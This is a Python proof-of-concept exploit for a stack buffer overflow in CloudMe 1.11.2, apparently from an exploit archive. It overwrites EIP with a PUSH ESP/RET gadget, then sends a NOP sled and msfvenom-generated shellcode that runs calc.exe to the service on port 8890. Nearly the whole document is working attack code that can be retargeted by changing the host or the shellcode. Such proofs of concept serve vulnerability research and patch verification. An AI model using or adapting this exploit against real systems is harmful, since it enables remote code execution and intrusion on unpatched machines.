# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xdb\xd9\xd9\x74\x24\xf4\x5a\xb8\xb4\x17\x26\xeb"
payload += b"\x33\xc9\xb1\x52\x31\x42\x17\x03\x42\x17\x83\x76"
payload += b"\x13\xc4\x1e\x8a\xf4\x8a\xe1\x72\x05\xeb\x68\x97"
payload += b"\x34\x2b\x0e\xdc\x67\x9b\x44\xb0\x8b\x50\x08\x20"
payload += b"\x1f\x14\x85\x47\xa8\x93\xf3\x66\x29\x8f\xc0\xe9"
payload += b"\xa9\xd2\x14\xc9\x90\x1c\x69\x08\xd4\x41\x80\x58"
payload += b"\x8d\x0e\x37\x4c\xba\x5b\x84\xe7\xf0\x4a\x8c\x14"
payload += b"\x40\x6c\xbd\x8b\xda\x37\x1d\x2a\x0e\x4c\x14\x34"
payload += b"\x53\x69\xee\xcf\xa7\x05\xf1\x19\xf6\xe6\x5e\x64"
payload += b"\x36\x15\x9e\xa1\xf1\xc6\xd5\xdb\x01\x7a\xee\x18"
payload += b"\x7b\xa0\x7b\xba\xdb\x23\xdb\x66\xdd\xe0\xba\xed"
payload += b"\xd1\x4d\xc8\xa9\xf5\x50\x1d\xc2\x02\xd8\xa0\x04"
payload += b"\x83\x9a\x86\x80\xcf\x79\xa6\x91\xb5\x2c\xd7\xc1"
payload += b"\x15\x90\x7d\x8a\xb8\xc5\x0f\xd1\xd4\x2a\x22\xe9"
payload += b"\x24\x25\x35\x9a\x16\xea\xed\x34\x1b\x63\x28\xc3"
payload += b"\x5c\x5e\x8c\x5b\xa3\x61\xed\x72\x60\x35\xbd\xec"
payload += b"\x41\x36\x56\xec\x6e\xe3\xf9\xbc\xc0\x5c\xba\x6c"
payload += b"\xa1\x0c\x52\x66\x2e\x72\x42\x89\xe4\x1b\xe9\x70"
payload += b"\x6f\x2e\xe4\x74\x40\x46\xfa\x88\xbd\xbf\x73\x6e"
payload += b"\xab\xaf\xd5\x39\x44\x49\x7c\xb1\xf5\x96\xaa\xbc"
payload += b"\x36\x1c\x59\x41\xf8\xd5\x14\x51\x6d\x16\x63\x0b"
payload += b"\x38\x29\x59\x23\xa6\xb8\x06\xb3\xa1\xa0\x90\xe4"
payload += b"\xe6\x17\xe9\x60\x1b\x01\x43\x96\xe6\xd7\xac\x12"
payload += b"\x3d\x24\x32\x9b\xb0\x10\x10\x8b\x0c\x98\x1c\xff"
payload += b"\xc0\xcf\xca\xa9\xa6\xb9\xbc\x03\x71\x15\x17\xc3"
payload += b"\x04\x55\xa8\x95\x08\xb0\x5e\x79\xb8\x6d\x27\x86"
payload += b"\x75\xfa\xaf\xff\x6b\x9a\x50\x2a\x28\xaa\x1a\x76"
payload += b"\x19\x23\xc3\xe3\x1b\x2e\xf4\xde\x58\x57\x77\xea"
payload += b"\x20\xac\x67\x9f\x25\xe8\x2f\x4c\x54\x61\xda\x72"
payload += b"\xcb\x82\xcf"

buf = payload

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8890))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)